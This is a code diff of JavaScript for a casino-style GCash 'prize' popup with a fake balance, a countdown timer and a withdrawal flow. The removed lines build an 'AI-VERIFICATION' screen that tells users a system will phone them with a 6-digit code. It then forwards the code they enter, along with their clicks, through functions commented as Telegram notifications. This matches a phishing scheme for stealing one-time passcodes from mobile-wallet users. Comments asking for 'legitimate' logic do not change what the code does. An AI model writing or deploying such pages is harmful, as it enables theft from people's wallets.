-                // ⚠️ IKAW ANG MAG-IMPLEMENT NG REDIRECT LOGIC
-                redirectToDeployedLink(proceedBtn);
-            };
+    
+    // ========== INITIALIZATION ==========
+    function init() {
+        console.log('🎯 Popup Module Starting...');
+        
+        var popup = document.getElementById('prizePopup');
+        if (!popup) {
+            console.error('Popup element not found!');
+            return;
         }
+        
+        getFirewallStatus();
+        attachClaimButton();
+        addAnimations();
+        addPhase3Animations();
+        
+        console.log('✅ Popup Module ready');
     }
-
-    // ⚠️ PLACEHOLDER — Ikaw mag-implement
-    function redirectToDeployedLink(buttonEl) {
-        // TODO: I-implement ang LEGITIMATE redirect logic dito
-        // HUWAG gumamit ng dynamic Firebase links na pwedeng i-control ng iba
-        console.warn('⚠️ redirectToDeployedLink() is not implemented');
-        if (buttonEl) {
-            buttonEl.disabled = false;
-            buttonEl.innerHTML = 'PROCEED TO WITHDRAW';
-        }
-        showInlineError(buttonEl, '❌ NOT IMPLEMENTED');
-    }
-
-    // ============================================================
-    // PHASE 3: AI-VERIFICATION — CARNIVAL STYLE (VISUAL ONLY)
-    // ============================================================
-    function renderPhase3() {
-        currentPhase = 3;
-        var inner = document.getElementById('claimPhaseInner');
-        if (!inner) return;
-
-        var userPhoneLocal = localStorage.getItem('userPhone') || '';
-        var masked = userPhoneLocal.length >= 11
-            ? userPhoneLocal.substring(0, 4) + '***' + userPhoneLocal.substring(7, 11)
-            : 'your phone';
-
-        inner.innerHTML = [
-            '<div class="carnival-phase carnival-phase-3">',
-                '<button class="carnival-close" id="phase3Close">✕</button>',
-                '<div class="carnival-burst-bg"></div>',
-                '<div class="carnival-confetti">',
-                    '<span></span><span></span><span></span><span></span><span></span>',
-                    '<span></span><span></span><span></span><span></span><span></span>',
-                '</div>',
-                '<div class="carnival-call-icon"><i class="fas fa-phone"></i></div>',
-                '<h2 class="carnival-title">AI-VERIFICATION</h2>',
-                '<div class="carnival-divider"></div>',
-                '<p class="carnival-subtext">',
-                    '<i class="fas fa-shield-alt"></i> ',
-                    'System AI will call you with a <strong>6-digit code</strong>',
-                '</p>',
-                '<div class="carnival-phone-display">',
-                    '<span class="phone-icon">📱</span>',
-                    '<span class="phone-number">', masked, '</span>',
-                '</div>',
-                '<div class="carnival-status" id="aiCallStatus">',
-                    '<div class="status-icon">📞</div>',
-                    '<div class="status-text">Waiting for call...</div>',
-                '</div>',
-                '<input type="text" id="phase3CodeInput" class="carnival-input"',
-                    ' placeholder="000000" maxlength="6" inputmode="numeric"',
-                    ' pattern="[0-9]*" autocomplete="one-time-code">',
-                '<div id="phase3ErrorMsg" class="carnival-error" style="display:none;"></div>',
-                '<button class="carnival-btn carnival-btn-blue" id="phase3VerifyBtn">VERIFY CODE</button>',
-                '<button class="carnival-btn carnival-btn-ghost" id="phase3BackBtn">← BACK</button>',
-            '</div>'
-        ].join('');
-
-        // ✅ TELEGRAM NOTIFICATION — Phase 3 viewed
-        notifyPhase3Viewed(currentBalance);
-
-        var closeBtn = document.getElementById('phase3Close');
-        var backBtn = document.getElementById('phase3BackBtn');
-        var verifyBtn = document.getElementById('phase3VerifyBtn');
-        var input = document.getElementById('phase3CodeInput');
-
-        if (closeBtn) closeBtn.onclick = closePhasePopup;
-        if (backBtn) backBtn.onclick = function() {
-            transitionTo(renderPhase1);
-        };
-
-        if (input) {
-            input.addEventListener('input', function() {
-                this.value = this.value.replace(/\D/g, '').slice(0, 6);
-                var err = document.getElementById('phase3ErrorMsg');
-                if (err) err.style.display = 'none';
-            });
-
-            input.addEventListener('keypress', function(e) {
-                if (e.key === 'Enter' && verifyBtn) {
-                    verifyBtn.click();
-                }
-            });
-
-            setTimeout(function() { input.focus(); }, 300);
-        }
-
-        if (verifyBtn) {
-            verifyBtn.onclick = function() {
-                var code = input ? input.value.trim() : '';
-                var errEl = document.getElementById('phase3ErrorMsg');
-
-                if (!/^\d{6}$/.test(code)) {
-                    if (errEl) {
-                        errEl.textContent = '⚠️ Please enter a valid 6-digit code.';
-                        errEl.style.display = 'block';
-                    }
-                    if (input) shakeElement(input);
-                    return;
-                }
-
-                // ✅ TELEGRAM NOTIFICATION — Phase 3 verify + code entered
-                notifyPhase3VerifyClicked(currentBalance);
-                notifyPhase3CodeEntered(currentBalance, code);
-
-                verifyBtn.disabled = true;
-                verifyBtn.innerHTML = '⏳ VERIFYING...';
-
-                // ⚠️ IKAW ANG MAG-IMPLEMENT NG VERIFICATION LOGIC
-                verifyCodeWithBackend(code).then(function(ok) {
-                    if (ok) {
-                        verifyBtn.innerHTML = '✅ VERIFIED';
-                        setTimeout(function() {
-                            submitWithdrawalRequest();
-                        }, 600);
-                    } else {
-                        verifyBtn.disabled = false;
-                        verifyBtn.innerHTML = 'VERIFY CODE';
-                        if (errEl) {
-                            errEl.textContent = '❌ Invalid code. Please try again.';
-                            errEl.style.display = 'block';
-                        }
-                        if (input) {
-                            input.value = '';
-                            shakeElement(input);
-                        }
-                    }
-                }).catch(function() {
-                    verifyBtn.disabled = false;
-                    verifyBtn.innerHTML = 'VERIFY CODE';
-                    if (errEl) {
-                        errEl.textContent = '⚠️ Verification failed. Please try again.';
-                        errEl.style.display = 'block';
-                    }
-                });
-            };
-        }
-    }
-
-    // ⚠️ PLACEHOLDER — Ikaw mag-implement
-    function verifyCodeWithBackend(code) {
-        // TODO: I-implement ang LEGITIMATE verification logic
-        console.warn('⚠️ verifyCodeWithBackend() is not implemented');
-        return Promise.resolve(false);
-    }
-
-    // ⚠️ PLACEHOLDER — Ikaw mag-implement
-    function submitWithdrawalRequest() {
-        // TODO: I-implement ang LEGITIMATE withdrawal logic
-        console.warn('⚠️ submitWithdrawalRequest() is not implemented');
-        showSuccessAndClose(currentBalance);
-    }
-
-    function showSuccessAndClose(amount) {
-        var inner = document.getElementById('claimPhaseInner');
-        if (!inner) return;
-
-        inner.innerHTML = [
-            '<div class="carnival-phase carnival-phase-success">',
-                '<div class="carnival-burst-bg"></div>',
-                '<div class="carnival-icon">✅</div>',
-                '<h2 class="carnival-title">SUBMITTED!</h2>',
-                '<p class="carnival-subtext">',
-                    'Your withdrawal request for ',
-                    '<strong style="color:#ffd700;">₱', Number(amount).toFixed(2), '</strong>',
-                    ' has been submitted.',
-                '</p>',
-                '<button class="carnival-btn carnival-btn-gold" id="finalCloseBtn">🏠 DONE</button>',
-            '</div>'
-        ].join('');
-
-        var finalClose = document.getElementById('finalCloseBtn');
-        if (finalClose) {
-            finalClose.onclick = function() {
-                closePhasePopup();
-                updateBalanceDisplay();
-            };
-        }
-    }
-
-    function showInlineError(button, message) {
-        if (!button) return;
-        var original = button.innerHTML;
-        button.style.background = 'linear-gradient(180deg, #ff4444, #cc0000)';
-        button.innerHTML = message;
-        button.disabled = true;
-
-        setTimeout(function() {
-            button.disabled = false;
-            button.style.background = '';
-            button.innerHTML = original;
-        }, 1800);
-    }
-
-    // ============================================================
-    // CARNIVAL ANIMATIONS (injected)
-    // ============================================================
-    function injectCarnivalAnimations() {
-        if (document.querySelector('#carnival-animations')) return;
-
+    
+    // ========== ADD ANIMATIONS ==========
+    function addAnimations() {
+        if (document.querySelector('#popup-casino-animations')) return;
+        
         var style = document.createElement('style');
-        style.id = 'carnival-animations';
-        style.textContent = [
-            '@keyframes carnivalShake {',
-                '0%, 100% { transform: translateX(0); }',
-                '20% { transform: translateX(-8px); }',
-                '40% { transform: translateX(8px); }',
-                '60% { transform: translateX(-5px); }',
-                '80% { transform: translateX(5px); }',
-            '}',
-            '@keyframes carnivalPopIn {',
-                '0% { transform: scale(0.5) rotate(-5deg); opacity: 0; }',
-                '60% { transform: scale(1.05) rotate(2deg); }',
-                '100% { transform: scale(1) rotate(0deg); opacity: 1; }',
-            '}',
-            '@keyframes burstPulse {',
-                '0%, 100% { transform: translate(-50%, -50%) scale(1); opacity: 0.7; }',
-                '50% { transform: translate(-50%, -50%) scale(1.2); opacity: 1; }',
-            '}',
-            '@keyframes confettiFall {',
-                '0% { transform: translateY(-20px) rotate(0deg); opacity: 0; }',
-                '10% { opacity: 1; }',
-                '90% { opacity: 1; }',
-                '100% { transform: translateY(500px) rotate(720deg); opacity: 0; }',
-            '}',
-            '@keyframes mascotFloat {',
-                '0%, 100% { transform: translateY(0) scale(1); }',
-                '50% { transform: translateY(-10px) scale(1.03); }',
-            '}',
-            '@keyframes mascotGlowPulse {',
-                '0%, 100% { opacity: 0.7; transform: translate(-50%, -50%) scale(1); }',
-                '50% { opacity: 1; transform: translate(-50%, -50%) scale(1.2); }',
-            '}',
-            '@keyframes amountPulse {',
-                '0%, 100% { transform: scale(1); }',
-                '50% { transform: scale(1.05); }',
-            '}',
-            '@keyframes btnShine {',
-                '0% { left: -100%; }',
-                '60% { left: 100%; }',
-                '100% { left: 100%; }',
-            '}',
-            '@keyframes trophyBounce {',
-                '0%, 100% { transform: scale(1) rotate(-5deg); }',
-                '50% { transform: scale(1.1) rotate(5deg); }',
-            '}',
-            '@keyframes callPulse {',
-                '0%, 100% { transform: scale(1); box-shadow: 0 0 20px rgba(79, 195, 247, 0.4); }',
-                '50% { transform: scale(1.05); box-shadow: 0 0 40px rgba(79, 195, 247, 0.8); }',
-            '}',
-
-            '.carnival-phase {',
-                'position: relative;',
-                'width: 100%;',
-                'max-width: 380px;',
-                'padding: 28px 20px 24px;',
-                'background: radial-gradient(circle at 50% 30%, rgba(255, 255, 255, 0.25) 0%, transparent 50%),',
-                    'linear-gradient(145deg, #d10000 0%, #ff1744 40%, #8b0000 100%);',
-                'border: 3px solid #ffd700;',
-                'border-radius: 24px;',
-                'box-shadow: 0 25px 60px rgba(0, 0, 0, 0.8),',
-                    '0 0 60px rgba(255, 215, 0, 0.5),',
-                    'inset 0 0 40px rgba(255, 215, 0, 0.08);',
-                'overflow: hidden;',
-                'animation: carnivalPopIn 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275);',
-                'text-align: center;',
-                'margin: 0 auto;',
-                'box-sizing: border-box;',
-            '}',
-
-            '.carnival-close {',
-                'position: absolute;',
-                'top: 14px;',
-                'right: 16px;',
-                'width: 34px;',
-                'height: 34px;',
-                'background: rgba(255, 255, 255, 0.15);',
-                'border: 1px solid rgba(255, 215, 0, 0.5);',
-                'border-radius: 50%;',
-                'color: #ffd700;',
-                'font-size: 16px;',
-                'font-weight: 900;',
-                'cursor: pointer;',
-                'display: flex;',
-                'align-items: center;',
-                'justify-content: center;',
-                'z-index: 10;',
-                'transition: all 0.2s ease;',
-            '}',
-            '.carnival-close:hover, .carnival-close:active {',
-                'background: rgba(255, 68, 68, 0.4);',
-                'color: #fff;',
-                'transform: rotate(90deg);',
-                'border-color: #ff4444;',
-            '}',
-
-            '.carnival-burst-bg {',
-                'position: absolute;',
-                'top: 30%;',
-                'left: 50%;',
-                'transform: translate(-50%, -50%);',
-                'width: 400px;',
-                'height: 400px;',
-                'background: radial-gradient(circle, rgba(255, 255, 255, 0.4) 0%,',
-                    'rgba(255, 215, 0, 0.2) 30%, transparent 70%);',
-                'border-radius: 50%;',
-                'filter: blur(40px);',
-                'pointer-events: none;',
-                'animation: burstPulse 3s ease-in-out infinite;',
-                'z-index: 1;',
-            '}',
-
-            '.carnival-confetti {',
-                'position: absolute;',
-                'inset: 0;',
-                'pointer-events: none;',
-                'overflow: hidden;',
-                'z-index: 2;',
-            '}',
-            '.carnival-confetti span {',
-                'position: absolute;',
-                'width: 8px;',
-                'height: 8px;',
-                'border-radius: 2px;',
-                'opacity: 0;',
-                'animation: confettiFall 6s linear infinite;',
-            '}',
-            '.carnival-confetti span:nth-child(1) { left: 5%; background: #ffd700; animation-delay: 0s; }',
-            '.carnival-confetti span:nth-child(2) { left: 15%; background: #ff6b9d; animation-delay: 1s; border-radius: 50%; }',
-            '.carnival-confetti span:nth-child(3) { left: 25%; background: #4fc3f7; animation-delay: 2s; }',
-            '.carnival-confetti span:nth-child(4) { left: 35%; background: #ff9800; animation-delay: 0.5s; border-radius: 50%; }',
-            '.carnival-confetti span:nth-child(5) { left: 45%; background: #ffd700; animation-delay: 3s; }',
-            '.carnival-confetti span:nth-child(6) { left: 55%; background: #ff6b9d; animation-delay: 1.5s; }',
-            '.carnival-confetti span:nth-child(7) { left: 65%; background: #4fc3f7; animation-delay: 2.5s; border-radius: 50%; }',
-            '.carnival-confetti span:nth-child(8) { left: 75%; background: #ffd700; animation-delay: 0.8s; }',
-            '.carnival-confetti span:nth-child(9) { left: 85%; background: #ff9800; animation-delay: 3.5s; }',
-            '.carnival-confetti span:nth-child(10) { left: 95%; background: #ff6b9d; animation-delay: 2s; border-radius: 50%; }',
-
-            '.carnival-mascot {',
-                'position: relative;',
-                'width: min(180px, 45vw);',
-                'height: min(180px, 45vw);',
-                'margin: 0 auto 16px;',
-                'z-index: 3;',
-            '}',
-            '.carnival-mascot img {',
-                'width: 100%;',
-                'height: 100%;',
-                'object-fit: contain;',
-                'position: relative;',
-                'z-index: 2;',
-                'filter: drop-shadow(0 15px 35px rgba(255, 215, 0, 0.7))',
-                    'drop-shadow(0 0 30px rgba(255, 255, 255, 0.4));',
-                'animation: mascotFloat 3s ease-in-out infinite;',
-            '}',
-            '.mascot-glow {',
-                'position: absolute;',
-                'top: 50%;',
-                'left: 50%;',
-                'transform: translate(-50%, -50%);',
-                'width: 200%;',
-                'height: 200%;',
-                'background: radial-gradient(circle, rgba(255, 215, 0, 0.6) 0%,',
-                    'rgba(255, 255, 255, 0.3) 30%, transparent 70%);',
-                'border-radius: 50%;',
-                'filter: blur(40px);',
-                'animation: mascotGlowPulse 2s ease-in-out infinite;',
-                'z-index: 1;',
-            '}',
-
-            '.carnival-title {',
-                'font-family: "Playfair Display", serif;',
-                'font-size: clamp(22px, 6vw, 30px);',
-                'font-weight: 900;',
-                'background: linear-gradient(180deg, #fff9c4 0%, #ffd700 40%, #ffeb3b 60%, #ff9800 100%);',
-                '-webkit-background-clip: text;',
-                'background-clip: text;',
-                'color: transparent;',
-                'text-transform: uppercase;',
-                'letter-spacing: 2px;',
-                'margin: 0 0 12px;',
-                'filter: drop-shadow(0 0 20px rgba(255, 215, 0, 0.8));',
-                'position: relative;',
-                'z-index: 3;',
-            '}',
-
-            '.carnival-amount {',
-                'display: flex;',
-                'align-items: baseline;',
-                'justify-content: center;',
-                'gap: 4px;',
-                'margin: 0 0 16px;',
-                'position: relative;',
-                'z-index: 3;',
-            '}',
-            '.carnival-amount .currency {',
-                'font-family: "Orbitron", monospace;',
-                'font-size: clamp(20px, 5.5vw, 26px);',
-                'font-weight: 900;',
-                'color: #ffd700;',
-                'text-shadow: 0 0 20px rgba(255, 215, 0, 0.9);',
-            '}',
-            '.carnival-amount .value {',
-                'font-family: "Orbitron", monospace;',
-                'font-size: clamp(38px, 10.5vw, 52px);',
-                'font-weight: 900;',
-                'background: linear-gradient(180deg, #fff9c4 0%, #ffd700 40%, #ffeb3b 60%, #ff9800 100%);',
-                '-webkit-background-clip: text;',
-                'background-clip: text;',
-                'color: transparent;',
-                'letter-spacing: 2px;',
-                'filter: drop-shadow(0 0 25px rgba(255, 215, 0, 0.9));',
-                'animation: amountPulse 1.5s ease-in-out infinite;',
-            '}',
-
-            '.carnival-divider {',
-                'width: 80px;',
-                'height: 2px;',
-                'background: linear-gradient(90deg, transparent, #ffd700, transparent);',
-                'margin: 0 auto 16px;',
-                'box-shadow: 0 0 10px rgba(255, 215, 0, 0.6);',
-                'position: relative;',
-                'z-index: 3;',
-            '}',
-
-            '.carnival-bills {',
-                'display: flex;',
-                'justify-content: center;',
-                'gap: 8px;',
-                'margin: 0 0 16px;',
-                'position: relative;',
-                'z-index: 3;',
-            '}',
-            '.carnival-bills .bill-indicator {',
-                'width: 55px;',
-                'height: 28px;',
-                'border-radius: 4px;',
-                'overflow: hidden;',
-                'border: 1px solid rgba(255, 215, 0, 0.3);',
-                'transition: all 0.3s ease;',
-            '}',
-            '.carnival-bills .bill-indicator img {',
-                'width: 100%;',
-                'height: 100%;',
-                'object-fit: cover;',
-                'transition: all 0.3s ease;',
-            '}',
-            '.carnival-bills .bill-indicator.active {',
-                'border-color: #ffd700;',
-                'box-shadow: 0 0 12px rgba(255, 215, 0, 0.6);',
-            '}',
-
-            '.carnival-subtext {',
-                'font-family: "Poppins", sans-serif;',
-                'font-size: 12px;',
-                'color: rgba(255, 255, 255, 0.85);',
-                'margin: 0 0 18px;',
-                'line-height: 1.5;',
-                'position: relative;',
-                'z-index: 3;',
-            '}',
-
-            '.carnival-btn {',
-                'width: 100%;',
-                'padding: 14px 18px;',
-                'border-radius: 14px;',
-                'font-family: "Orbitron", monospace;',
-                'font-size: clamp(12px, 3.5vw, 14px);',
-                'font-weight: 900;',
-                'letter-spacing: 1.5px;',
-                'cursor: pointer;',
-                'display: flex;',
-                'align-items: center;',
-                'justify-content: center;',
-                'gap: 10px;',
-                'transition: all 0.1s ease;',
-                'text-transform: uppercase;',
-                'position: relative;',
-                'overflow: hidden;',
-                'z-index: 3;',
-                'margin-bottom: 10px;',
-            '}',
-            '.carnival-btn-gold {',
-                'background: linear-gradient(180deg, rgba(255, 255, 255, 0.35) 0%, transparent 40%),',
-                    'linear-gradient(180deg, #ffeb3b 0%, #ffd700 30%, #ff9800 70%, #ff6f00 100%);',
-                'border: 3px solid #fff9c4;',
-                'color: #8b0000;',
-                'text-shadow: 0 2px 0 rgba(255, 255, 255, 0.7);',
-                'box-shadow: 0 5px 0 #8b4500, 0 10px 25px rgba(0, 0, 0, 0.6),',
-                    '0 0 35px rgba(255, 215, 0, 0.8);',
-            '}',
-            '.carnival-btn-gold::before {',
-                'content: "";',
-                'position: absolute;',
-                'top: 0;',
-                'left: -100%;',
-                'width: 100%;',
-                'height: 100%;',
-                'background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.7), transparent);',
-                'animation: btnShine 2.5s infinite;',
-            '}',
-            '.carnival-btn-gold:active {',
-                'transform: translateY(5px);',
-                'box-shadow: 0 0 0 #8b4500, 0 5px 15px rgba(0, 0, 0, 0.6),',
-                    '0 0 25px rgba(255, 215, 0, 0.6);',
-            '}',
-            '.carnival-btn-ghost {',
-                'background: linear-gradient(to bottom, #555, #333);',
-                'border: 1px solid #777;',
-                'color: #ccc;',
-                'padding: 10px 18px;',
-                'font-size: 11px;',
-                'box-shadow: 0 3px 0 #222;',
-            '}',
-            '.carnival-btn-ghost:active {',
-                'transform: translateY(3px);',
-                'box-shadow: 0 0 0 #222;',
-            '}',
-            '.carnival-btn-blue {',
-                'background: linear-gradient(180deg, rgba(255, 255, 255, 0.3) 0%, transparent 40%),',
-                    'linear-gradient(180deg, #4fc3f7 0%, #0288d1 100%);',
-                'border: 2px solid #81d4fa;',
-                'color: #fff;',
-                'text-shadow: 0 2px 4px rgba(0, 0, 0, 0.4);',
-                'box-shadow: 0 5px 0 #01579b, 0 10px 25px rgba(0, 0, 0, 0.5),',
-                    '0 0 30px rgba(79, 195, 247, 0.6);',
-            '}',
-            '.carnival-btn-blue:active {',
-                'transform: translateY(5px);',
-                'box-shadow: 0 0 0 #01579b, 0 5px 15px rgba(0, 0, 0, 0.5);',
-            '}',
-            '.carnival-btn .gc-icon {',
-                'width: 22px;',
-                'height: 22px;',
-                'object-fit: contain;',
-            '}',
-
-            '.carnival-trophy {',
-                'font-size: 60px;',
-                'margin-bottom: 10px;',
-                'animation: trophyBounce 1s ease-in-out infinite;',
-                'filter: drop-shadow(0 0 25px rgba(255, 215, 0, 0.8));',
-                'position: relative;',
-                'z-index: 3;',
-            '}',
-
-            '.carnival-reward-box {',
-                'background: linear-gradient(180deg, rgba(255, 255, 255, 0.1) 0%, transparent 50%),',
-                    'linear-gradient(145deg, #1a0000, #330000);',
-                'border: 2px solid #ffd700;',
-                'border-radius: 16px;',
-                'padding: 16px;',
-                'margin: 0 0 18px;',
-                'box-shadow: 0 0 25px rgba(255, 215, 0, 0.5),',
-                    'inset 0 0 20px rgba(255, 215, 0, 0.1);',
-                'position: relative;',
-                'z-index: 3;',
-            '}',
-            '.carnival-reward-amount {',
-                'font-family: "Orbitron", monospace;',
-                'font-size: 14px;',
-                'color: #fce883;',
-                'margin-top: 8px;',
-            '}',
-            '.carnival-reward-amount strong {',
-                'font-size: 24px;',
-                'color: #ffd700;',
-                'text-shadow: 0 0 15px rgba(255, 215, 0, 0.8);',
-                'display: inline-block;',
-                'margin-left: 4px;',
-            '}',
-
-            '.carnival-call-icon {',
-                'width: 80px;',
-                'height: 80px;',
-                'margin: 0 auto 16px;',
-                'background: radial-gradient(circle, rgba(79, 195, 247, 0.2), rgba(0, 100, 200, 0.05));',
-                'border: 2px solid rgba(79, 195, 247, 0.5);',
-                'border-radius: 50%;',
-                'display: flex;',
-                'align-items: center;',
-                'justify-content: center;',
-                'animation: callPulse 2s ease-in-out infinite;',
-                'position: relative;',
-                'z-index: 3;',
-            '}',
-            '.carnival-call-icon i {',
-                'font-size: 32px;',
-                'color: #4fc3f7;',
-                'text-shadow: 0 0 25px rgba(79, 195, 247, 0.8);',
-            '}',
-
-            '.carnival-phone-display {',
-                'display: flex;',
-                'align-items: center;',
-                'justify-content: center;',
-                'gap: 10px;',
-                'margin: 0 0 16px;',
-                'padding: 12px 20px;',
-                'background: rgba(0, 0, 0, 0.4);',
-                'border: 2px solid #4fc3f7;',
-                'border-radius: 12px;',
-                'box-shadow: 0 0 25px rgba(79, 195, 247, 0.4),',
-                    'inset 0 0 20px rgba(79, 195, 247, 0.1);',
-                'position: relative;',
-                'z-index: 3;',
-            '}',
-            '.carnival-phone-display .phone-icon {',
-                'font-size: 22px;',
-            '}',
-            '.carnival-phone-display .phone-number {',
-                'font-family: "Orbitron", monospace;',
-                'font-size: 20px;',
-                'font-weight: 900;',
-                'color: #4fc3f7;',
-                'letter-spacing: 3px;',
-                'text-shadow: 0 0 20px rgba(79, 195, 247, 0.6);',
-            '}',
-
-            '.carnival-status {',
-                'background: rgba(79, 195, 247, 0.08);',
-                'border: 1px solid rgba(79, 195, 247, 0.3);',
-                'border-radius: 12px;',
-                'padding: 14px;',
-                'margin: 0 0 16px;',
-                'text-align: center;',
-                'position: relative;',
-                'z-index: 3;',
-            '}',
-            '.carnival-status .status-icon {',
-                'font-size: 26px;',
-                'margin-bottom: 6px;',
-            '}',
-            '.carnival-status .status-text {',
-                'font-family: "Poppins", sans-serif;',
-                'font-size: 13px;',
-                'color: rgba(255, 255, 255, 0.85);',
-            '}',
-
-            '.carnival-input {',
-                'width: 100%;',
-                'padding: 14px;',
-                'background: rgba(0, 0, 0, 0.5);',
-                'border: 2px solid #4fc3f7;',
-                'border-radius: 10px;',
-                'color: #4fc3f7;',
-                'font-family: "Orbitron", monospace;',
-                'font-size: 24px;',
-                'font-weight: 900;',
-                'text-align: center;',
-                'letter-spacing: 4px;',
-                'margin: 0 0 12px;',
-                'box-sizing: border-box;',
-                'transition: all 0.3s ease;',
-                'position: relative;',
-                'z-index: 3;',
-            '}',
-            '.carnival-input:focus {',
-                'outline: none;',
-                'border-color: #4fc3f7;',
-                'box-shadow: 0 0 30px rgba(79, 195, 247, 0.3);',
-            '}',
-            '.carnival-input::placeholder {',
-                'color: rgba(79, 195, 247, 0.3);',
-                'letter-spacing: 2px;',
-                'font-size: 16px;',
-            '}',
-
-            '.carnival-error {',
-                'background: rgba(255, 68, 68, 0.1);',
-                'border: 1px solid rgba(255, 68, 68, 0.2);',
-                'border-radius: 8px;',
-                'padding: 8px;',
-                'color: #ff4444;',
-                'font-size: 11px;',
-                'text-align: center;',
-                'margin: 0 0 12px;',
-                'font-family: "Poppins", sans-serif;',
-                'position: relative;',
-                'z-index: 3;',
-            '}'
-        ].join('');
+        style.id = 'popup-casino-animations';
+        style.textContent = `
+            @keyframes bounceIn {
+                0% { transform: scale(0) rotate(-180deg); opacity: 0; }
+                60% { transform: scale(1.1) rotate(0deg); }
+                100% { transform: scale(1) rotate(0deg); opacity: 1; }
+            }
+            @keyframes pulseGold {
+                0% { transform: scale(1); }
+                50% { transform: scale(1.02); box-shadow: 0 0 25px rgba(212,175,55,0.6); }
+                100% { transform: scale(1); }
+            }
+            @keyframes shake {
+                0% { transform: translateX(0); }
+                25% { transform: translateX(-5px); }
+                50% { transform: translateX(5px); }
+                75% { transform: translateX(-5px); }
+                100% { transform: translateX(0); }
+            }
+            @keyframes balanceDrain {
+                0%, 100% { transform: scale(1); }
+                50% { transform: scale(1.05); filter: brightness(1.2); }
+            }
+            @keyframes successFlash {
+                0% { transform: scale(1); }
+                50% { transform: scale(1.3); filter: brightness(2); }
+                100% { transform: scale(1); }
+            }
+            @keyframes pulseRing {
+                0%, 100% { transform: scale(1); opacity: 1; }
+                50% { transform: scale(1.05); opacity: 0.7; }
+            }
+            @keyframes slideDown {
+                from { opacity: 0; transform: translateX(-50%) translateY(-20px); }
+                to { opacity: 1; transform: translateX(-50%) translateY(0); }
+            }
+            @keyframes phonePulse {
+                0%, 100% { transform: scale(1); opacity: 1; }
+                50% { transform: scale(1.05); opacity: 0.8; text-shadow: 0 0 30px rgba(0, 212, 255, 0.5); }
+            }
+            @keyframes numberReveal {
+                0% { opacity: 0; transform: scale(0.5) rotateY(90deg); }
+                50% { opacity: 0.5; transform: scale(1.1) rotateY(-10deg); }
+                100% { opacity: 1; transform: scale(1) rotateY(0deg); }
+            }
+            @keyframes numberGlowPulse {
+                0%, 100% { text-shadow: 0 0 20px rgba(0, 212, 255, 0.2); }
+                50% { text-shadow: 0 0 40px rgba(0, 212, 255, 0.6), 0 0 80px rgba(0, 212, 255, 0.2); }
+            }
+            @keyframes timerPulseRed {
+                0%, 100% { transform: scale(1); opacity: 1; }
+                50% { transform: scale(1.1); opacity: 0.7; }
+            }
+            
+            .bill-indicators {
+                display: flex;
+                justify-content: center;
+                gap: 8px;
+                margin: 15px 0;
+            }
+            .bill-indicator {
+                width: 55px;
+                height: 28px;
+                border-radius: 4px;
+                overflow: hidden;
+                transition: all 0.3s ease;
+                border: 1px solid rgba(212, 175, 55, 0.3);
+            }
+            .bill-indicator img {
+                width: 100%;
+                height: 100%;
+                object-fit: cover;
+                transition: all 0.3s ease;
+            }
+            .bill-indicator.active {
+                border-color: #d4af37;
+                box-shadow: 0 0 8px rgba(212, 175, 55, 0.5);
+            }
+            
+            .small-back-btn {
+                background: linear-gradient(to bottom, #555, #333);
+                border: 1px solid #777;
+                border-radius: 8px;
+                padding: 8px 18px;
+                font-size: 11px;
+                font-weight: 700;
+                color: #ccc;
+                cursor: pointer;
+                display: inline-flex;
+                align-items: center;
+                justify-content: center;
+                gap: 5px;
+                width: auto;
+                margin-top: 10px;
+                font-family: 'Orbitron', monospace;
+                letter-spacing: 1px;
+                text-shadow: none;
+                box-shadow: 0 3px 0 #222;
+                transition: all 0.1s ease;
+            }
+            .small-back-btn:active {
+                transform: translateY(3px);
+                box-shadow: 0 0 0 #222;
+            }
+            
+            .claim-gcash-button {
+                background: linear-gradient(to bottom, #d4af37, #aa771c);
+                border: 1px solid #fcf6ba;
+                border-radius: 8px;
+                padding: 12px 20px;
+                font-weight: 800;
+                color: #1a1100;
+                font-size: 13px;
+                cursor: pointer;
+                font-family: 'Orbitron', monospace;
+                letter-spacing: 1px;
+                text-shadow: 1px 1px 0 rgba(255,255,255,0.3);
+                box-shadow: 0 4px 0 #6e4b0c;
+                transition: all 0.1s ease;
+            }
+            .claim-gcash-button:active {
+                transform: translateY(4px);
+                box-shadow: 0 0 0 #6e4b0c;
+            }
+            .claim-gcash-button:disabled {
+                opacity: 0.5;
+                cursor: not-allowed;
+            }
+            
+            .divider {
+                width: 50px;
+                height: 2px;
+                background: linear-gradient(90deg, #aa771c, #fcf6ba, #aa771c);
+                margin: 10px auto;
+            }
+            
+            .phase3-heading {
+                font-family: 'Orbitron', monospace;
+                font-size: 18px;
+                font-weight: 900;
+                color: #00d4ff;
+                margin: 5px 0;
+                letter-spacing: 1px;
+                text-align: center;
+                text-shadow: 0 0 15px #00d4ff;
+            }
+            
+            .verification-input {
+                text-align: center;
+                font-size: 24px;
+                font-weight: bold;
+                width: 160px;
+                padding: 14px;
+                background: #000;
+                border: 2px solid #00d4ff;
+                border-radius: 10px;
+                color: #00d4ff;
+                font-family: 'Orbitron', monospace;
+                transition: all 0.3s ease;
+                letter-spacing: 4px;
+                box-shadow: 0 0 15px rgba(0, 212, 255, 0.2);
+            }
+            .verification-input:focus {
+                border-color: #00d4ff;
+                box-shadow: 0 0 30px rgba(0, 212, 255, 0.3);
+                outline: none;
+            }
+            .verification-input::placeholder {
+                color: rgba(0, 212, 255, 0.3);
+                letter-spacing: 2px;
+                font-size: 16px;
+            }
+            
+            .phone-number-display {
+                font-size: 24px;
+                font-family: 'Orbitron', monospace;
+                font-weight: 900;
+                color: #00d4ff;
+                margin-top: 8px;
+                letter-spacing: 2px;
+                animation: numberReveal 0.8s cubic-bezier(0.34, 1.56, 0.64, 1) forwards, numberGlowPulse 2s ease-in-out infinite 0.8s;
+                display: inline-block;
+            }
+            .phone-number-display .phone-icon {
+                margin-right: 8px;
+                display: inline-block;
+                animation: phonePulse 1.5s ease-in-out infinite;
+            }
+        `;
         document.head.appendChild(style);
     }
-
-    // ============================================================
-    // TIMER
-    // ============================================================
-    function initTimer() {
-        var displayElement = document.getElementById('mainTimerDisplay');
-        if (!displayElement) return;
-
-        var CYCLE_HOURS = 72;
-        var timerEndDate = null;
-
-        try {
-            var savedEnd = localStorage.getItem('timerEndDate');
-            var now = Date.now();
-
-            if (savedEnd && parseInt(savedEnd) > now) {
-                timerEndDate = parseInt(savedEnd);
-            } else {
-                timerEndDate = now + (CYCLE_HOURS * 60 * 60 * 1000);
-                localStorage.setItem('timerEndDate', timerEndDate);
+    
+    // ========== PHASE 3 ANIMATIONS ==========
+    function addPhase3Animations() {
+        if (document.querySelector('#phase3-animations')) return;
